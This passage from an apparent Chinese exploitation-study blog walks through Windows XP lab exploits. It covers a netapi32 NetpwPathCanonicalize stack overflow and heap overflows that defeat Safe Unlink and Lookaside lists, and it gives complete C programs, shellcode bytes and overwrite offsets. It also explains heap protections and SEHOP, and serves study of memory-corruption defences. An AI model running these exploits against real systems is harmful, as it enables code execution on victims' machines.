//load vulnerability netapi32.dll which we got from a WINXP sp0 host HINSTANCE LibHandle; MYPROC Trigger; char dll[ ] = &quot;./netapi32.dll&quot;; // care for the path char VulFunc[ ] = &quot;NetpwPathCanonicalize&quot;; LibHandle = LoadLibrary(dll); Trigger = (MYPROC) GetProcAddress(LibHandle, VulFunc); // fill PathName memset(PathName1,0,sizeof(PathName1)); memset(PathName1,0,sizeof(PathName1)); memset(PathName1,&#x27;a&#x27;,sizeof(PathName1)-2); memset(PathName2,0,sizeof(PathName2)); memset(PathName2,0,sizeof(PathName2)); memset(PathName2,&#x27;b&#x27;,sizeof(PathName2)-2); // set Prefix as a null string memset(Prefix1,0,sizeof(Prefix1)); memset(Prefix2,0,sizeof(Prefix2)); // call NetpwPathCanonicalize several times to overflow (Trigger)(PathName1,Outbuf,1 ,Prefix1,&amp;PathType1,0); (Trigger)(PathName2,Outbuf,OutbufLen,Prefix2,&amp;PathType2,0); FreeLibrary(LibHandle); return 0;&#125; 动态调试 在动态调试时，当第二次调用 NetpwPathCanonicalize，运行至 0x5FDDA33E 处的 wcscat 时发生了栈溢出，如下图所示。 可以看到， EBP、返回地址以及 CanonicalizePathName 的部分参数被覆盖，溢出成功。ecx 始终指向栈中（0x0012EA18），那我们就选用 0x71BBFCBE 处的 CALL ECX 作为跳板。 从上面溢出图片可以看出，0x0012EE2C 是被 ”bbbb“ 溢出覆盖了，我们只用找到它相对偏移就能够替换掉 0x0012EE2C 处的内容。向前找到 b 的起始位置，可以看到 b 从 0x0012EB9A 处开始，相对偏移就是 0x(292+4)。直接在钩造完成后，复制前，把PathName2[296] 覆盖为我们想要的地址( 0x71BBFCBE )。 因为我们需要执行 shellcode，所以我们要把 shellcode 放在 PathName1 的开头，就能运行。 按照如下布局，构建代码。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970#include &lt;windows.h&gt;typedef void (__stdcall * MYPROC)(LPTSTR, LPTSTR, int, LPTSTR, long *, long);#define PATH1_SIZE (0xc2*2)#define PATH2_SIZE (0x150*2)#define OUTBUF_SIZE 0x440#define PREFIX_SIZE 0x410char ShellCode[]= &quot;\\xFC\\x68\\x6A\\x0A\\x38\\x1E\\x68\\x63\\x89\\xD1\\x4F\\x68\\x32\\x74\\x91\\x0C&quot; &quot;\\x8B\\xF4\\x8D\\x7E\\xF4\\x33\\xDB\\xB7\\x04\\x2B\\xE3\\x66\\xBB\\x33\\x32\\x53&quot; &quot;\\x68\\x75\\x73\\x65\\x72\\x54\\x33\\xD2\\x64\\x8B\\x5A\\x30\\x8B\\x4B\\x0C\\x8B&quot; &quot;\\x49\\x1C\\x8B\\x09\\x8B\\x69\\x08\\xAD\\x3D\\x6A\\x0A\\x38\\x1E\\x75\\x05\\x95&quot; &quot;\\xFF\\x57\\xF8\\x95\\x60\\x8B\\x45\\x3C\\x8B\\x4C\\x05\\x78\\x03\\xCD\\x8B\\x59&quot; &quot;\\x20\\x03\\xDD\\x33\\xFF\\x47\\x8B\\x34\\xBB\\x03\\xF5\\x99\\x0F\\xBE\\x06\\x3A&quot; &quot;\\xC4\\x74\\x08\\xC1\\xCA\\x07\\x03\\xD0\\x46\\xEB\\xF1\\x3B\\x54\\x24\\x1C\\x75&quot; &quot;\\xE4\\x8B\\x59\\x24\\x03\\xDD\\x66\\x8B\\x3C\\x7B\\x8B\\x59\\x1C\\x03\\xDD\\x03&quot; &quot;\\x2C\\xBB\\x95\\x5F\\xAB\\x57\\x61\\x3D\\x6A\\x0A\\x38\\x1E\\x75\\xA9\\x33\\xDB&quot; &quot;\\x53\\x68\\x77\\x65\\x73\\x74\\x68\\x66\\x61\\x69\\x6C\\x8B\\xC4\\x53\\x50\\x50&quot; &quot;\\x53\\xFF\\x57\\xFC\\x53\\xFF\\x57\\xF8&quot;;int main()&#123; char PathName1[PATH1_SIZE]; char PathName2[PATH2_SIZE]; char Outbuf[OUTBUF_SIZE]; int OutbufLen=OUTBUF_SIZE; char Prefix1[PREFIX_SIZE]; char Prefix2[PREFIX_SIZE]; long PathType1=44; long PathType2=44; //load vulnerability netapi32.dll which we got from a WINXP sp0 host HINSTANCE LibHandle; MYPROC Trigger; char dll[ ] = &quot;./netapi32.dll&quot;; // care for the path char VulFunc[ ] = &quot;NetpwPathCanonicalize&quot;; LibHandle = LoadLibrary(dll); Trigger = (MYPROC) GetProcAddress(LibHandle, VulFunc); // fill PathName memset(PathName1,0,sizeof(PathName1)); memset(PathName1,0,sizeof(PathName1)); memset(PathName1,&#x27;a&#x27;,sizeof(PathName1)-2); // 将ShellCode拷贝到缓冲区中 memcpy(PathName1, ShellCode, sizeof(ShellCode)); // 将ShellCode后面的0x00填充为0x90 PathName1[sizeof(ShellCode)-1] = 0x90; // set Prefix as a null string memset(Prefix1,0,sizeof(Prefix1)); memset(Prefix2,0,sizeof(Prefix2)); memset(PathName2,0,sizeof(PathName2)); memset(PathName2,0,sizeof(PathName2)); memset(PathName2,&#x27;b&#x27;,sizeof(PathName2)-2); // 将返回地址覆盖为jmp ebp 71BBFCBE PathName2[0x296] = 0xBE; PathName2[0x297] = 0xFC; PathName2[0x298] = 0xBB; PathName2[0x299] = 0x71; // call NetpwPathCanonicalize several times to overflow (Trigger)(PathName1,Outbuf,1 ,Prefix1,&amp;PathType1,0); (Trigger)(PathName2,Outbuf,OutbufLen,Prefix2,&amp;PathType2,0); FreeLibrary(LibHandle); return 0;&#125; 最后，运行，又是我们熟悉的对话框。","categories":[{"name":"0day安全","slug":"0day安全","permalink":"https://www.rgzzplus.com/categories/0day%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"漏洞","slug":"漏洞","permalink":"https://www.rgzzplus.com/tags/%E6%BC%8F%E6%B4%9E/"}]},{"title":"重重保护下的堆","slug":"重重保护下的堆","date":"2022-07-06T15:12:30.000Z","updated":"2022-08-01T11:17:34.263Z","comments":true,"path":"2022/07/06/重重保护下的堆/","link":"","permalink":"https://www.rgzzplus.com/2022/07/06/%E9%87%8D%E9%87%8D%E4%BF%9D%E6%8A%A4%E4%B8%8B%E7%9A%84%E5%A0%86/","excerpt":"","text":"[toc] 堆保护机制的原理 堆中的安全校验操作 **PEB random：**在 Windows XP SP2 之后不再使用固定的 PEB 基址 0x7ffdf000，而是使用具有一定随机性的 PEB 基址。Matt C onover 指出这种变动只是在 0x7FFDF000~0x7FFD4000 之间移动。覆盖 PEB 中函数指针的利用方式请参见 “堆溢出利用（下）”中的实验和“攻击 PEB 中的函数指针” 的相关介绍。 Safe Unlink： 微软改写了操作双向链表的代码，在卸载 free list 中的堆块时更加小心。 对照“堆溢出利用（上）——DWORD SHOOT”中关于双向链表拆卸问题的描述，在 SP2 之前的链表拆卸操作类似于如下代码： 123456int remove (ListNode * node)&#123; node -&gt; blink -&gt; flink = node -&gt; flink; node -&gt; flink -&gt; blink = node -&gt; blink; return 0;&#125; SP2 之后在进行删除操作时，将提前验证堆块前向指针和后向指针的完整性，以防止发生DWORD SHOOT： 1234567891011121314int safe_remove (ListNode * node)&#123; if( (node-&gt;blink-&gt;flink==node)&amp;&amp;(node-&gt;flink-&gt;blink==node) ) &#123; node -&gt; blink -&gt; flink = node -&gt; flink; node -&gt; flink -&gt; blink = node -&gt; blink; return 1; &#125; else &#123; 链表指针被破坏，进入异常 return 0; &#125;&#125; heap cookie： 与栈中的 security cookie 类似，微软在堆中也引入了 cookie，用于检测堆溢出的发生。cookie 被布置在堆首部分原堆块的 segment table 的位置，占 1 个字节大小。 元数据加密： 微软在 Windows Vista 及后续版本的操作系统中开始使用该安全措施。块首中的一些重要数据在保存时会与一个 4 字节的随机数进行异或运算，在使用这些数据时候需要再进行一次异或运行来还原。 攻击堆中存储的变量 堆中的各项保护措施是对堆块的关键结构进行保护，而对于堆中存储的内容是不保护的。如果堆中存放着一些重要的数据或结构指针，如函数指针等内容，通过覆盖这些重要的内容还是可以实现溢出的。这种攻击手段与堆保护措施没有什么联系，所以我们在这就不过多讨论了。 利用 chunk 重设大小攻击堆 Safe Unlink 精髓之处在于从 FreeList[n]上拆卸 chunk 时对双向链表的有效性进行验证。但对于插入 chunk 却没有校验。 链表中会发生插入操作的情况： （1）内存释放后 chunk 不再被使用时它会被重新链入链表。 （2）当 chunk 的内存空间大于申请的空间时，剩余的空间会被建立成一个新的 chunk，链入链表中。 从 FreeList[0]上申请空间的过程： （1）将 FreeList[0]上最后一个 chunk 的大小与申请空间的大小进行比较，如果 chunk 的大小大于等于申请的空间， 则继续分派，否则扩展空间（若超大堆块链表无法满足分配，则扩展堆）。 （2）从 FreeList[0]的第一个 chunk 依次检测，直到找到第一个符合要求的 chunk，然后将其从链表中拆卸下来（搜索恰巧合适的堆块进行分配）。 （3）分配好空间后如果 chunk 中还有剩余空间，剩余的空间会被建立成一个新 chunk，并插入到链表中（堆块空间过剩则切分之）。 在这三个步骤中，第一步我们没有任何利用的机会。由于 Safe Unlink 的存在，如果我们去覆盖 chunk 的结构在第二步的时候就会被检测出来，这么看来我们没有任何利用的机会。但是 Safe Unlink 中存在一个让人疑惑的问题，即便 Safe Unlink 检测到 chunk 结构已经被破坏，它还是会允许后续的一些操作执行，例如重设 chunk 的大小。 分析重设 chunk 的具体过程 12345678910#include&lt;stdio.h&gt;#include&lt;windows.h&gt;void main()&#123; HLOCAL h1; HANDLE hp; hp = HeapCreate(0,0x1000,0x10000); __asm int 3 h1 = HeapAlloc(hp,HEAP_ZERO_MEMORY,0x10);&#125; 推荐使用的环境 操作系统 Windows XP Pro SP2 编译环境 VC++ 6.0 build 版本 release 版本 说明：实验过程中的堆地址等信息在您的实验环境中可能会稍有区别。 调试观察内存状态，可以看到堆的起始地址为 0x00390000（ EAX 的值）， FreeList[0]位于0x00390178，在 0x00390178 处可以看到唯一的 chunk 位于 0x00390688。此时 FreeList[0]头节点和 chunk 如图 15.3.1 所示。 接下来分析将新 chunk 插入链表的过程。在 0x7C931513 的位置下设断点，这是修改 chunk 中下一chunk 指针和上一 chunk 指针的开始。该地址为 ntdll 加载基址+0x11513，如果您的实验环境地址有所变化，请用此方法自行确认。 新 chunk 插入链表的过程： 新chunk 插入过程归纳： 新 chunk-&gt;Flink=旧 chunk-&gt;Flink 新 chunk-&gt;Blink=旧 chunk-&gt;Flink-&gt;Blink 旧 chunk-&gt;Flink-&gt;Blink-&gt;Flink=新 chunk 旧 chunk-&gt;Flink-&gt;Blink=新 chunk 插入完成后，观察FreeList[0]的链表结构 考虑下如果将旧 chunk 的 Flink 和 Blink 指针都覆盖了会出现情况呢？例如，我们将旧 chunk 的 Flink 指针覆盖为 0xAAAAAAAA，Blink 指针覆盖为 0xBBBBBBBB，套用我们前面归纳的公式，可以得出如下结果 1234[0x003906A0]=0xAAAAAAAA[0x003906A0+4]=[0xAAAAAAAA+4][[0xAAAAAAAA+4]]=0x003906A0[0xAAAAAAAA+4]=0x003906A0 这实际上是一个向任意地址写入固定值的漏洞（DWORD SHOOT），而 Safe Unlink 的验证的不严密性却能执行这个 DWORD SHOOT。如果将内存中的某个函数指针或者 S.E.H 处理函数指针覆盖为 shellcode 的地址，不就可以实现溢出了吗？ 注意： 0xAAAAAAAA+4 必须指向可读可写的地址，而 0xAAAAAAAA+4 中存放的地址必须指向可写的地址，否则会出现异常。 实验代码 123456789101112131415161718192021222324252627282930#include &lt;stdio.h&gt;#include &lt;windows.h&gt;void main()&#123; char shellcode[]= &quot;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90&quot; &quot;\\x10\\x01\\x10\\x00\\x99\\x99\\x99\\x99&quot; &quot;\\xEB\\x06\\x39\\x00\\xEB\\x06\\x39\\x00&quot;//覆盖 Flink 和 Blink &quot;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90&quot; &quot;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90&quot; &quot;\\xEB\\x31\\x90\\x90\\x90\\x90\\x90\\x90&quot;//跳转指令，跳过下面的垃圾代码 &quot;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90&quot; &quot;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90&quot; &quot;\\x11\\x01\\x10\\x00\\x99\\x99\\x99\\x99&quot; &quot;\\x8C\\x06\\x39\\x00\\xE4\\xFF\\x12\\x00&quot;//伪造的 Flink 和 Blink &quot;\\xFC\\x68\\x6A\\x0A\\x38\\x1E\\x68\\x63\\x89\\xD1\\x4F\\x68\\x32\\x74\\x91\\x0C&quot; &quot;……&quot; &quot;\\x53\\xFF\\x57\\xFC\\x53\\xFF\\x57\\xF8&quot; ; HLOCAL h1,h2; HANDLE hp; hp = HeapCreate(0,0x1000,0x10000); __asm int 3 h1 = HeapAlloc(hp,HEAP_ZERO_MEMORY,16); memcpy(h1,shellcode,300); h2 = HeapAlloc(hp,HEAP_ZERO_MEMORY,16); int zero=0; zero=1/zero; printf(&quot;%d&quot;,zero);&#125; 实验思路 （1）首先 h1 向堆中申请 16 个字节的空间。 （2）由于此时堆刚刚初始化所以空间是从 FreeList[0]中申请的，从 FreeList[0]中拆卸下来的 chunk 在分配好空间后会将剩余的空间新建一个 chunk 并插入到 FreeList[0]中， 所以 h1 后面会跟着一个大空闲块。 （3）当向 h1 中复制超过 16 个字节空间时就会覆盖后面 chunk 的块首。 （4） Chunk 的块首被覆盖后，当 h2 申请空间时，程序就会从被破坏的 chunk 中分配空间，并将剩余空间新建为一个 chunk 并插入到 FreeList[0]中。 （5）通过伪造 h2 申请空间前 chunk 的 Flink 和 Blink，实现在新 chunk 插入 FreeList[0]时将新 chunk 的 Flink 起始地址写入到任意地址。因此通过控制 h2 申请空间前 chunk 的 Flink 和Blink 值，可以将数据写入到异常处理函数指针所在位置。 （6）通过制造除 0 异常，让程序转入异常处理，进而劫持程序流程，让程序转入 shellcode 执行。 推荐使用的环境 操作系统 Windows XP Pro SP2 编译环境 VC++ 6.0 build 版本 release 版本 说明：实验过程中的堆地址等信息在您的实验环境中可能会稍有区别。 实验步骤 构造填充字符串 （ 1）先用16个 \\x90 填充shellcode，然后编译运行调试。待程序在 0x00401050 处中断后观察内存状态。 h1 的数据部分起始地址为 0x00390688，后面 chunk 的 Flink 位于 0x003906A0，因此需要 32 个字节的字符串就可以覆盖掉 h1 后面 chunk 的 Flink 和 Blink（通过分析堆结构也可计算出填充字符串的长度）。现在需要选择一些内存地址来填充 Flink 和 Blink，在这我们不妨用 0x003906EB 分别填充 Flink 和 Blink。 思考： 为什么要使用 0x003906EB？大家看看 0xEB06 眼熟不？对，这是一个短跳转指令，稍后我们会再次解释如何用短跳指令越过垃圾代码，到达 shellcode。 （ 2）确定[Flink]和[Flink+4]的值。覆盖程序的默认异常处理函数句柄，让[Flink+4]=0x0012FFE4，而[Flink] 对于我们来说没有什么作用，所以随便填充一些内容即可，当然为了防止在某个没有分析到的地方使用这个地址，在这设置为 0x0039068C。 当 h2 申请空间后就会发生以下事情： 1234[0x003906B8]=0x003906EB[0x003906B8+4]=0x0012FFE4[0x0012FFE4]= 0x003906B8[0x003906EB +4]=0x003906B8 重新布置 shellcode 验证分析 123456789101112char shellcode[]=&quot;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90&quot;&quot;\\x10\\x01\\x10\\x00\\x99\\x99\\x99\\x99&quot;&quot;\\xEB\\x06\\x39\\x00\\xEB\\x06\\x39\\x00&quot;//覆盖原始 chunk 中的 Flink 和 Blink&quot;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90&quot;&quot;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90&quot;&quot;\\xEB\\x31\\x90\\x90\\x90\\x90\\x90\\x90&quot;&quot;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90&quot;&quot;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90&quot;&quot;\\x11\\x01\\x10\\x00\\x99\\x99\\x99\\x99&quot;&quot;\\x8C\\x06\\x39\\x00\\xE4\\xFF\\x12\\x00&quot;//伪造的 Flink 和 Blink; 编译调试运行，在为 h2分配内存的heapalloc() 中的 0x7C93152F 处，即所有 Flink 和 Blink 调整完成后，观察堆块状态。与我们的分析一致。 布置 shellcode 将谈对话框的机器码放在 0x003906F3 的位置，即伪造的 Flink 和 Blink 后面，并在前面的 0x90 填充区放置短跳转指令来跳过伪造的 Flink 和 Blink，防止它们对程序执行产生影响。 1234567891011121314151617181920212223char shellcode[]=&quot;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90&quot;&quot;\\x10\\x01\\x10\\x00\\x99\\x99\\x99\\x99&quot;&quot;\\xEB\\x06\\x39\\x00\\xEB\\x06\\x39\\x00&quot;//覆盖 Flink 和 Blink&quot;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90&quot;&quot;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90&quot;&quot;\\xEB\\x31\\x90\\x90\\x90\\x90\\x90\\x90&quot;//跳转指令，跳过下面的垃圾代码&quot;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90&quot;&quot;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90&quot;&quot;\\x11\\x01\\x10\\x00\\x99\\x99\\x99\\x99&quot;&quot;\\x8C\\x06\\x39\\x00\\xB4\\xFF\\x12\\x00&quot;//伪造的 Flink 和 Blink&quot;\\xFC\\x68\\x6A\\x0A\\x38\\x1E\\x68\\x63\\x89\\xD1\\x4F\\x68\\x32\\x74\\x91\\x0C&quot;&quot;\\x8B\\xF4\\x8D\\x7E\\xF4\\x33\\xDB\\xB7\\x04\\x2B\\xE3\\x66\\xBB\\x33\\x32\\x53&quot;&quot;\\x68\\x75\\x73\\x65\\x72\\x54\\x33\\xD2\\x64\\x8B\\x5A\\x30\\x8B\\x4B\\x0C\\x8B&quot;&quot;\\x49\\x1C\\x8B\\x09\\x8B\\x69\\x08\\xAD\\x3D\\x6A\\x0A\\x38\\x1E\\x75\\x05\\x95&quot;&quot;\\xFF\\x57\\xF8\\x95\\x60\\x8B\\x45\\x3C\\x8B\\x4C\\x05\\x78\\x03\\xCD\\x8B\\x59&quot;&quot;\\x20\\x03\\xDD\\x33\\xFF\\x47\\x8B\\x34\\xBB\\x03\\xF5\\x99\\x0F\\xBE\\x06\\x3A&quot;&quot;\\xC4\\x74\\x08\\xC1\\xCA\\x07\\x03\\xD0\\x46\\xEB\\xF1\\x3B\\x54\\x24\\x1C\\x75&quot;&quot;\\xE4\\x8B\\x59\\x24\\x03\\xDD\\x66\\x8B\\x3C\\x7B\\x8B\\x59\\x1C\\x03\\xDD\\x03&quot;&quot;\\x2C\\xBB\\x95\\x5F\\xAB\\x57\\x61\\x3D\\x6A\\x0A\\x38\\x1E\\x75\\xA9\\x33\\xDB&quot;&quot;\\x53\\x68\\x77\\x65\\x73\\x74\\x68\\x66\\x61\\x69\\x6C\\x8B\\xC4\\x53\\x50\\x50&quot;&quot;\\x53\\xFF\\x57\\xFC\\x53\\xFF\\x57\\xF8&quot;; 将程序中的 shellcode 按照上面的布局设置，去掉 INT 3，重新编译程序。弹出异常对话框，直接点击 “调试”，就能看到 failwest 对话框了。 利用 Lookaside 表进行堆溢出 Safe Unlink 对空表中双向链表进行了有效性验证，而对于快表中的单链表是没有进行验证的，所以我们可以利用快表进行堆溢出。 从快表中拆卸结点过程： 与前面一样，利用链表拆卸过程中的指针伪造思路。 实验代码 1234567891011121314151617181920212223242526272829303132333435363738394041424344#include&lt;stdio.h&gt;#include&lt;windows.h&gt;void main()&#123;char shellcode []= &quot;\\xEB\\x40\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90&quot; //填充 &quot;\\x03\\00\\x03\\x00\\x5C\\x01\\x08\\x99&quot;//填充 &quot;\\xE4\\xFF\\x12\\x00&quot;//用默认异常处理函数指针所在位置覆盖 &quot;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90&quot; //填充 &quot;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90&quot; //填充 &quot;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90&quot; //填充 &quot;\\xFC\\x68\\x6A\\x0A\\x38\\x1E\\x68\\x63\\x89\\xD1\\x4F\\x68\\x32\\x74\\x91\\x0C&quot; &quot;\\x8B\\xF4\\x8D\\x7E\\xF4\\x33\\xDB\\xB7\\x04\\x2B\\xE3\\x66\\xBB\\x33\\x32\\x53&quot; &quot;\\x68\\x75\\x73\\x65\\x72\\x54\\x33\\xD2\\x64\\x8B\\x5A\\x30\\x8B\\x4B\\x0C\\x8B&quot; &quot;\\x49\\x1C\\x8B\\x09\\x8B\\x69\\x08\\xAD\\x3D\\x6A\\x0A\\x38\\x1E\\x75\\x05\\x95&quot; &quot;\\xFF\\x57\\xF8\\x95\\x60\\x8B\\x45\\x3C\\x8B\\x4C\\x05\\x78\\x03\\xCD\\x8B\\x59&quot; &quot;\\x20\\x03\\xDD\\x33\\xFF\\x47\\x8B\\x34\\xBB\\x03\\xF5\\x99\\x0F\\xBE\\x06\\x3A&quot; &quot;\\xC4\\x74\\x08\\xC1\\xCA\\x07\\x03\\xD0\\x46\\xEB\\xF1\\x3B\\x54\\x24\\x1C\\x75&quot; &quot;\\xE4\\x8B\\x59\\x24\\x03\\xDD\\x66\\x8B\\x3C\\x7B\\x8B\\x59\\x1C\\x03\\xDD\\x03&quot; &quot;\\x2C\\xBB\\x95\\x5F\\xAB\\x57\\x61\\x3D\\x6A\\x0A\\x38\\x1E\\x75\\xA9\\x33\\xDB&quot; &quot;\\x53\\x68\\x77\\x65\\x73\\x74\\x68\\x66\\x61\\x69\\x6C\\x8B\\xC4\\x53\\x50\\x50&quot; &quot;\\x53\\xFF\\x57\\xFC\\x53\\xFF\\x57\\xF8&quot; ; HLOCAL h1,h2,h3; HANDLE hp; hp = HeapCreate(0,0,0); __asm int 3 h1 = HeapAlloc(hp,HEAP_ZERO_MEMORY,16); h2 = HeapAlloc(hp,HEAP_ZERO_MEMORY,16); h3 = HeapAlloc(hp,HEAP_ZERO_MEMORY,16); HeapFree(hp,0,h3); HeapFree(hp,0,h2); memcpy(h1,shellcode,300); h2 = HeapAlloc(hp,HEAP_ZERO_MEMORY,16); h3 = HeapAlloc(hp,HEAP_ZERO_MEMORY,16); memcpy(h3,&quot;\\x90\\x1E\\x39\\x00&quot;,4); int zero=0; zero=1/zero; printf(&quot;%d&quot;,zero);&#125; 实验思路 （1）首先申请 3 块 16 字节的空间，然后将其释放到快表中，以便下次申请空间时可以从快表中分配。 （2）通过向 h1 中复制超长字符串来覆盖 h2 块首中下一堆块的指针。 （3）用户申请空间时我们伪造的下一堆块地址就会被赋值给 Lookaside[2]-&gt;next，当用户再次申请空间时系统就会将我们伪造的地址作为用户申请空间的起始地址返回给用户。 （4）当我们将这个地址设置为异常处理函数指针所在位置时就可以伪造异常处理函数了。 （5）通过制造除 0 异常，让程序转入异常处理，进而劫持程序流程，让程序转入 shellcode 执行。 推荐使用的环境 备 注 操作系统 Windows XP Pro SP2 编译环境 VC++ 6.0 build 版本 release 版本 说明：实验过程中的堆地址等信息在您的实验环境中可能会稍有区别。 注意：此实验在常态堆下进行，注意不要用调试态。 直接编译运行程序，在弹出的对话框中单击“调试”，进入OD调试。分析程序在执行完两次释放操作后内存状态，记下 h1、 h2 和 h3 的值，这个值大家可以通过每次执行完 HeapAlloc 的 EAX 获得，本次实验中 3 个地址分别为：0x00391E90、 0x00391EA8 和 0x00391EC0。 确定填充字符串的长度和异常处理函数指针所在位置。h1 中数据部分起始地址为 0x00391E90，而 h2 中下一堆块指针位于 0x00391EA8，所以只需要向 h1 中复制超过 28 个字节的字符就可以覆盖掉 h2 中下一堆块。 123456char shellcode[]=&quot;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90&quot;//填充&quot;\\x03\\00\\x03\\x00\\x44\\x01\\x08\\x00&quot; //填充&quot;\\xE4\\xFF\\x12\\x00&quot; //用默认异常处理函数指针所在位置覆盖; 将程序运行到覆盖掉块首后第一次申请空间结束时，然后转到快表索引部分附近（0x00390688）。如下图，Lookaside[2] 中的下一块首地址已经被修改为 0x0012FEE4。 继续单步运行到再次申请空间结束时，通过 EAX 可以看到程序申请到的空间起始地址确实为 0x0012FFE4，如下图所示。 只要向这个刚申请的空间里写入 shellcode 的起始地址就能跳转运行 shellcode。为了演示方便，将弹出对话框的机器码放置在 h1 中，这样只需要在 0x0012FFE4 中写入 h1 的起始地址就可以在程序发生异常的时候劫持程序流程了。 shellcode 的布局 123456789101112131415char shellcode []=&quot;\\xEB\\x40\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90&quot;//填充&quot;\\x03\\00\\x03\\x00\\x44\\x01\\x08\\x00&quot; //填充&quot;\\xE4\\xFF\\x12\\x00&quot; //用默认异常处理函数指针所在位置覆盖&quot;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90&quot;//填充&quot;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90&quot;//填充&quot;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90&quot;//填充&quot;\\xFC\\x68\\x6A\\x0A\\x38\\x1E\\x68\\x63\\x89\\xD1\\x4F\\x68\\x32\\x74\\x91 \\x0C&quot;&quot;……&quot;&quot;\\x53\\xFF\\x57\\xFC\\x53\\xFF\\x57\\xF8&quot;; 按照上面的 shellcode 布局，去掉 INT 3 指令，重新编译运行。弹出异常对话框，直接单击 ”调试“ 就能看到对话框了。","categories":[{"name":"0day安全","slug":"0day安全","permalink":"https://www.rgzzplus.com/categories/0day%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"堆","slug":"堆","permalink":"https://www.rgzzplus.com/tags/%E5%A0%86/"}]},{"title":"S.E.H 终极防护：SEHOP","slug":"S-E-H-终极防护：SEHOP","date":"2022-06-28T10:03:37.000Z","updated":"2022-08-01T11:20:08.718Z","comments":true,"path":"2022/06/28/S-E-H-终极防护：SEHOP/","link":"","permalink":"https://www.rgzzplus.com/2022/06/28/S-E-H-%E7%BB%88%E6%9E%81%E9%98%B2%E6%8A%A4%EF%BC%9ASEHOP/","excerpt":"","text":"[toc] SEHOP 的原理 SEHOP（Structured Exception Handling Overwrite Protection），它在 Windows Server 2008 默认启用，而在 Windows Vista 和 Windows 7 中 SEHOP 默认是关闭的。 启用 SEHOP 有以下两种方式： （ 1）下载 http://go.microsoft.com/?linkid=9646972 的补丁，此补丁适用于 Windows 7 和 Windows Vista SP1。 （ 2）在注册表中 HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\kernel 下面找到 DisableExceptionChainValidation 项， 将该值设置为 0，即可启用 SEHOP。 程序中的各 S.E.H 函数是以单链表的形式存放于栈中的，而在这个链表的末端是程序的默认异常处理，它负责处理前面 S.E.H 函数都不能处理的异常。 SEHOP 的核心任务是检查这条 S.E.H 链的完整性，在程序转入异常处理前 SEHOP 会检查 S.E.H 链上最后一个异常处理函数是否为系统固定的终极异常处理函数。如果不是，则不会执行当前异常处理函数。 其验证代码如下： 1234567891011121314151617181920212223if (process_flags &amp; 0x40 == 0) &#123; //如果没有 SEH 记录则不进行检测 if (record != 0xFFFFFFFF) &#123; //开始检测 do &#123; if (record &lt; stack_bottom || record &gt; stack_top)// SEH 记录必须位于栈中 goto corruption; if ((char*)record + sizeof(EXCEPTION_REGISTRATION) &gt; stack_top) //SEH 记录结构需完全在栈中 goto corruption; if ((record &amp; 3) != 0) //SEH 记录必须 4 字节对齐 goto corruption; handler = record-&gt;handler; if (handler &gt;= stack_bottom &amp;&amp; handler &lt; stack_top) //异常处理函数地址不能位于栈中 goto corruption; record = record-&gt;next; &#125; while (record != 0xFFFFFFFF); //遍历 S.E.H 链 if ((TEB-&gt;word_at_offset_0xFCA &amp; 0x200) != 0) &#123; if (handler != &amp;FinalExceptionHandler)//核心检测，地球人都知道，不解释了 goto corruption; &#125; &#125;&#125; 攻击时，将 S.E.H 结构中的异常处理函数地址覆盖为跳板指令地址，跳板指令根据实际情况进行选择。当程序出现异常的时候，系统会从 S.E.H 链中取出异常处理函数来处理异常，异常处理函数的指针已经被覆盖，程序的流程就会被劫持，在经过一系列跳转后转入 shellcode 执行。由于覆盖异常处理函数指针时同时覆盖了指向下一异常处理结构的指针，这样的话 S.E.H 链就会被破坏，从而被 SEHOP 机制检测出。 SEHOP 检查是在 SafeSEH 的 RtlIsValidHandler 函数校验前进行的，也就是说利用攻击加载模块之外的地址、堆地址和未启用 SafeSEH 模块的方法都行不通了，必须要考虑其他的出路。理论上我们还有三种方法： （ 1）不去攻击 